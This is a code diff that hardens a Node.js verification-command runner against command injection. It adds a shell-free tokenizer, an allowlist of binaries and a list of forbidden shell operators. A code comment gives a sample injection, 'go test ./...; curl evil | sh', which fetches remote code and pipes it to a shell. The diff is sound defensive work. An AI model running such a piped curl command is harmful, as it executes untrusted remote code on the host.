@@ -2,11 +2,168 @@
  * Execute plan verification_targets in the product workspace (D7-w1).
  */
 
-import { execSync } from "node:child_process";
+import { execFileSync } from "node:child_process";
 import path from "node:path";
-import { defaultRoiWorkspaceRoot } from "./implementationProof.mjs";
+import {
+  defaultRoiWorkspaceRoot,
+  IMPLEMENTATION_PROOF_TRUST_MCP_VERIFIED
+} from "./implementationProof.mjs";
 
 export const VACUOUS_GO_TEST_MARKER = "[no tests to run]";
+
+// Verification targets are operator-authored command strings persisted in plan
+// rows. They are NOT free-form shell: the ROI lifecycle helper runs them and
+// stamps the canonical mcp_verified trust marker, so an attacker who can write a
+// plan must not be able to turn a verification pass into arbitrary code
+// execution. We tokenize each target with a small POSIX-style lexer (honoring
+// single/double quotes), split it into `&&`-joined segments, allow an optional
+// leading `cd <subdir>`, require every command segment to lead with an
+// allowlisted binary, and reject any other shell operator (`;`, `|`, `||`,
+// redirection, subshells, backgrounding). Because each segment is executed
+// argv-style via execFileSync (no shell), metacharacters *inside* quoted
+// arguments (e.g. `node -e "process.exit(0)"`) are passed literally and safely.
+// `go test ./...; curl evil | sh` is rejected.
+
+// Leading binaries permitted to run as verification oracles.
+const ALLOWED_ORACLE_BINARIES = new Set([
+  "go",
+  "task",
+  "npm",
+  "pnpm",
+  "yarn",
+  "node",
+  "python",
+  "python3",
+  "pytest",
+  "make",
+  "cargo",
+  "bun",
+  "deno"
+]);
+
+function unsafeOraclesAllowed() {
+  const flag = process.env.ROI_ORACLE_ALLOW_UNSAFE;
+  return flag === "1" || flag === "true";
+}
+
+/**
+ * Tokenize a command string into argv-style tokens plus the bare `&&` operator,
+ * honoring single and double quotes. Any *unquoted* shell operator other than
+ * `&&` (`;`, `|`, `||`, `&`, `<`, `>`, backtick, `$(`, `${`, `(`, `)`, newline)
+ * is rejected — those only have meaning to a shell, which we never invoke.
+ */
+function tokenizeOracleCommand(command) {
+  if (command.includes("\0")) {
+    throw new Error("verification_target contains a NUL byte");
+  }
+  const tokens = [];
+  let current = "";
+  let hasCurrent = false;
+  let i = 0;
+  const n = command.length;
+  const pushCurrent = () => {
+    if (hasCurrent) {
+      tokens.push({ type: "word", value: current });
+      current = "";
+      hasCurrent = false;
+    }
+  };
+  while (i < n) {
+    const ch = command[i];
+    if (ch === "'" || ch === '"') {
+      const quote = ch;
+      i += 1;
+      hasCurrent = true;
+      while (i < n && command[i] !== quote) {
+        current += command[i];
+        i += 1;
+      }
+      if (i >= n) {
+        throw new Error(`verification_target has an unterminated ${quote} quote: ${JSON.stringify(command)}`);
+      }
+      i += 1; // closing quote
+      continue;
+    }
+    if (ch === " " || ch === "\t") {
+      pushCurrent();
+      i += 1;
+      continue;
+    }
+    if (ch === "&") {
+      if (command[i + 1] === "&") {
+        pushCurrent();
+        tokens.push({ type: "and" });
+        i += 2;
+        continue;
+      }
+      throw new Error(`verification_target uses background operator '&': ${JSON.stringify(command)}`);
+    }
+    if (ch === "\n" || ch === "\r") {
+      throw new Error(`verification_target spans multiple lines: ${JSON.stringify(command)}`);
+    }
+    if (ch === ";" || ch === "|" || ch === "<" || ch === ">" || ch === "`" || ch === "(" || ch === ")") {
+      throw new Error(
+        `verification_target uses a forbidden shell operator '${ch}': ${JSON.stringify(command)}`
+      );
+    }
+    if (ch === "$" && (command[i + 1] === "(" || command[i + 1] === "{")) {
+      throw new Error(`verification_target uses shell expansion '$${command[i + 1]}': ${JSON.stringify(command)}`);
+    }
+    current += ch;
+    hasCurrent = true;
+    i += 1;
+  }
+  pushCurrent();
+  return tokens;
+}
+
+/**
+ * Parse a target into validated `&&`-joined segments. Each segment is either
+ * `{ kind: "cd", dir }` (only legal as the first segment, relative subdir only)
+ * or `{ kind: "exec", argv }` where argv[0] is an allowlisted binary. Throws on
+ * any violation.
+ */
+export function parseOracleCommand(command) {
+  const tokens = tokenizeOracleCommand(command);
+  const rawSegments = [];
+  let segment = [];
+  for (const token of tokens) {
+    if (token.type === "and") {
+      rawSegments.push(segment);
+      segment = [];
+    } else {
+      segment.push(token.value);
+    }
+  }
+  rawSegments.push(segment);
+
+  const segments = [];
+  for (const [index, argv] of rawSegments.entries()) {
+    if (argv.length === 0) {
+      throw new Error(`verification_target has an empty command segment: ${JSON.stringify(command)}`);
+    }
+    const head = argv[0];
+    if (head === "cd") {
+      if (index !== 0) {
+        throw new Error(`verification_target may only 'cd' as its first segment: ${JSON.stringify(command)}`);
+      }
+      const target = argv[1] ?? "";
+      if (!target || path.isAbsolute(target) || target.split("/").includes("..")) {
+        throw new Error(`verification_target 'cd' must target a relative subdirectory: ${JSON.stringify(command)}`);
+      }
+      segments.push({ kind: "cd", dir: target });
+      continue;
+    }
+    if (!ALLOWED_ORACLE_BINARIES.has(head)) {
+      throw new Error(
+        `verification_target command '${head}' is not an allowlisted oracle binary ` +
+          `(allowed: ${[...ALLOWED_ORACLE_BINARIES].sort().join(", ")})`
+      );
+    }
+    segments.push({ kind: "exec", argv });
+  }
+  return { segments };
+}
 
 export function roiPackageRoot(workspaceRoot = defaultRoiWorkspaceRoot()) {
   return path.join(workspaceRoot, "roi");
@@ -25,14 +182,20 @@ export function runOracleCommand(cmd, { cwd, timeoutMs = 600_000 } = {}) {
   if (!command) {
     return { ok: false, cmd: command, exitCode: 1, output: "empty verification_target" };
   }
+
+  let plan;
+  if (!unsafeOraclesAllowed()) {
+    try {
+      plan = parseOracleCommand(command);
+    } catch (err) {
+      return { ok: false, cmd: command, exitCode: 126, output: `blocked: ${err.message}` };
+    }
+  }
+
   try {
-    const out = execSync(command, {
-      cwd,
-      encoding: "utf8",
-      stdio: ["ignore", "pipe", "pipe"],
-      shell: true,
-      timeout: timeoutMs
-    });
+    const out = unsafeOraclesAllowed()
+      ? runViaShell(command, { cwd, timeoutMs })
+      : runViaSegments(plan.segments, { cwd, timeoutMs });
     const tail = out.slice(-8000);
     if (command.includes("go test") && tail.includes(VACUOUS_GO_TEST_MARKER)) {
       return {
@@ -58,6 +221,41 @@ export function runOracleCommand(cmd, { cwd, timeoutMs = 600_000 } = {}) {
     }
     return { ok: false, cmd: command, exitCode, output };
   }
+}
+
+// Escape hatch: only reached when ROI_ORACLE_ALLOW_UNSAFE is set. Kept behind
+// the env gate so the default path never spawns a shell on persisted input.
+function runViaShell(command, { cwd, timeoutMs }) {
+  // eslint-disable-next-line no-restricted-syntax
+  return execFileSync("/bin/sh", ["-c", command], {
+    cwd,
+    encoding: "utf8",
+    stdio: ["ignore", "pipe", "pipe"],
+    timeout: timeoutMs
+  });
+}
+
+// Run validated `&&`-chained segments without a shell. A leading `cd` only
+// shifts the cwd for subsequent exec segments; each exec runs argv directly via
+// execFileSync (no shell interpretation, so metacharacters can't be injected).
+function runViaSegments(segments, { cwd, timeoutMs }) {
+  let runCwd = cwd;
+  let combined = "";
+  for (const seg of segments) {
+    if (seg.kind === "cd") {
+      runCwd = path.resolve(runCwd, seg.dir);
+      continue;
+    }
+    const [bin, ...rest] = seg.argv;
+    const out = execFileSync(bin, rest, {
+      cwd: runCwd,
+      encoding: "utf8",
+      stdio: ["ignore", "pipe", "pipe"],
+      timeout: timeoutMs
+    });
+    combined += out;
+  }
+  return combined;
 }
 
 export function runPlanVerificationTargets(plan, options = {}) {
@@ -96,7 +294,7 @@ export function applyMcpOracleVerification(content, plan, options = {}) {
     ...prior,
     oracles_run,
     oracles_ok,
-    verified_by: "mcp"
+    verified_by: IMPLEMENTATION_PROOF_TRUST_MCP_VERIFIED
   };
   return { oracles_run, oracles_ok };
 }
@@ -128,7 +326,7 @@ export function applyVerifyGateOracleVerification(content, plans, options = {}) 
     by_plan,
     oracles_run,
     oracles_ok,
-    verified_by: "mcp"
+    verified_by: IMPLEMENTATION_PROOF_TRUST_MCP_VERIFIED
   };
   return { oracles_run, oracles_ok, by_plan };
 }
